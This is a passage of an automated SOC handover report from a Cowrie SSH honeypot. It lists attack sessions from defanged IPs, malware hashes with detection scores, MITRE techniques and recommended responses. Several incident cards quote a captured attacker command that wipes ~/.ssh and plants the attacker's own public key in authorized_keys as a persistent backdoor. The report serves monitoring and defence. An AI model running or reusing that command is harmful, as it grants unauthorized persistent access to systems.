| `2026-04-12 20:21:56` | `cowrie.client.kex` |
| `2026-04-12 20:21:56` | `cowrie.login.success` |
| `2026-04-12 20:21:56` | `cowrie.session.params` |
| `2026-04-12 20:21:56` | `cowrie.command.input` |
| `2026-04-12 20:21:56` | `cowrie.command.failed` |
| `2026-04-12 20:21:56` | `cowrie.log.closed` |
| `2026-04-12 20:21:57` | `cowrie.session.params` |
| `2026-04-12 20:21:57` | `cowrie.command.input` |
| `2026-04-12 20:21:57` | `cowrie.session.file_download` |
| `2026-04-12 20:21:57` | `cowrie.log.closed` |
| `2026-04-12 20:21:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3fe90cd94d8

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-04-12 20:21 |
| **Last Seen** | 2026-04-12 20:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:21:59` | `cowrie.session.connect` |
| `2026-04-12 20:21:59` | `cowrie.client.version` |
| `2026-04-12 20:21:59` | `cowrie.client.kex` |
| `2026-04-12 20:21:59` | `cowrie.login.success` |
| `2026-04-12 20:21:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9885ff23a97f

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-04-12 20:23 |
| **Last Seen** | 2026-04-12 20:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:23:42` | `cowrie.session.connect` |
| `2026-04-12 20:23:42` | `cowrie.client.version` |
| `2026-04-12 20:23:42` | `cowrie.client.kex` |
| `2026-04-12 20:23:43` | `cowrie.login.success` |
| `2026-04-12 20:23:43` | `cowrie.session.params` |
| `2026-04-12 20:23:43` | `cowrie.command.input` |
| `2026-04-12 20:23:43` | `cowrie.command.failed` |
| `2026-04-12 20:23:43` | `cowrie.log.closed` |
| `2026-04-12 20:23:43` | `cowrie.session.params` |
| `2026-04-12 20:23:43` | `cowrie.command.input` |
| `2026-04-12 20:23:44` | `cowrie.session.file_download` |
| `2026-04-12 20:23:44` | `cowrie.log.closed` |
| `2026-04-12 20:23:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c5b7c4a9102

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-04-12 20:23 |
| **Last Seen** | 2026-04-12 20:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:23:45` | `cowrie.session.connect` |
| `2026-04-12 20:23:45` | `cowrie.client.version` |
| `2026-04-12 20:23:45` | `cowrie.client.kex` |
| `2026-04-12 20:23:46` | `cowrie.login.success` |
| `2026-04-12 20:23:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a82a8bd82e9b

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-04-12 20:25 |
| **Last Seen** | 2026-04-12 20:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:25:21` | `cowrie.session.connect` |
| `2026-04-12 20:25:21` | `cowrie.client.version` |
| `2026-04-12 20:25:21` | `cowrie.client.kex` |
| `2026-04-12 20:25:21` | `cowrie.login.success` |
| `2026-04-12 20:25:22` | `cowrie.session.params` |
| `2026-04-12 20:25:22` | `cowrie.command.input` |
| `2026-04-12 20:25:22` | `cowrie.command.failed` |
| `2026-04-12 20:25:22` | `cowrie.log.closed` |
| `2026-04-12 20:25:22` | `cowrie.session.params` |
| `2026-04-12 20:25:22` | `cowrie.command.input` |
| `2026-04-12 20:25:22` | `cowrie.session.file_download` |
| `2026-04-12 20:25:22` | `cowrie.log.closed` |
| `2026-04-12 20:25:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-149ab328e684

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-04-12 20:25 |
| **Last Seen** | 2026-04-12 20:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:25:24` | `cowrie.session.connect` |
| `2026-04-12 20:25:24` | `cowrie.client.version` |
| `2026-04-12 20:25:24` | `cowrie.client.kex` |
| `2026-04-12 20:25:24` | `cowrie.login.success` |
| `2026-04-12 20:25:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e34a7e38ff2

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-04-12 20:28 |
| **Last Seen** | 2026-04-12 20:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:28:34` | `cowrie.session.connect` |
| `2026-04-12 20:28:34` | `cowrie.client.version` |
| `2026-04-12 20:28:34` | `cowrie.client.kex` |
| `2026-04-12 20:28:35` | `cowrie.login.success` |
| `2026-04-12 20:28:35` | `cowrie.session.params` |
| `2026-04-12 20:28:35` | `cowrie.command.input` |
| `2026-04-12 20:28:35` | `cowrie.command.failed` |
| `2026-04-12 20:28:35` | `cowrie.log.closed` |
| `2026-04-12 20:28:35` | `cowrie.session.params` |
| `2026-04-12 20:28:35` | `cowrie.command.input` |
| `2026-04-12 20:28:35` | `cowrie.session.file_download` |
| `2026-04-12 20:28:35` | `cowrie.log.closed` |
| `2026-04-12 20:28:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1119c9c55d21

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-04-12 20:28 |
| **Last Seen** | 2026-04-12 20:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:28:37` | `cowrie.session.connect` |
| `2026-04-12 20:28:37` | `cowrie.client.version` |
| `2026-04-12 20:28:37` | `cowrie.client.kex` |
| `2026-04-12 20:28:38` | `cowrie.login.success` |
| `2026-04-12 20:28:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `118.26.36[.]248` | **26** | 2026-04-12 19:47 | 2026-04-12 20:28 | 0m | 26 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `36.134.203[.]156` | **26** | 2026-04-12 20:09 | 2026-04-12 20:27 | 29m | 7 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `27.215.212[.]113` | **25** | 2026-04-12 19:59 | 2026-04-12 20:05 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `112.151.178[.]49` | **16** | 2026-04-12 18:44 | 2026-04-12 19:18 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `113.31.107[.]103` | 1 | 2026-04-12 20:13 | 2026-04-12 20:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.106[.]235` | 1 | 2026-04-12 20:14 | 2026-04-12 20:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]124` | 1 | 2026-04-12 20:10 | 2026-04-12 20:10 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `152.32.130[.]144` | 1 | 2026-04-12 19:47 | 2026-04-12 19:47 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `171.25.158[.]57` | 1 | 2026-04-12 19:44 | 2026-04-12 19:44 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `178.217.169[.]240` | 1 | 2026-04-12 20:11 | 2026-04-12 20:11 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.239.54[.]162` | 1 | 2026-04-12 20:10 | 2026-04-12 20:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-04-12 20:28 | 2026-04-12 20:30 | 119s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `178.217.169[.]240` | KG | KRENA - Kyrgyz research and education network association | **100** ⚠️ | 2 |
| `120.48.106[.]235` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 8 |
| `49.88.156[.]34` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `152.32.130[.]144` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 13 |
| `118.26.36[.]248` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |
| `36.134.203[.]156` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `171.25.158[.]57` | SE | Vaxjo NET C2IP | **100** ⚠️ | 50 |
| `183.239.54[.]162` | CN | China Mobile Communications Corporation | **100** ⚠️ | 35 |
| `113.31.107[.]103` | CN | Shanghai UCloud Information Technology Company Limited | **100** ⚠️ | 50 |
| `14.103.115[.]124` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 123 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 53 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 48 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 25 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 25 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 15 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 151 cases |
| Tool 34  | Credential Extractor        | ✅ 101 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 14 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (1.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 11 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 48 priority case(s) shown individually · 12 recon entry/entries in table (4 group(s) consolidating 93 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-12T20:34:05Z_
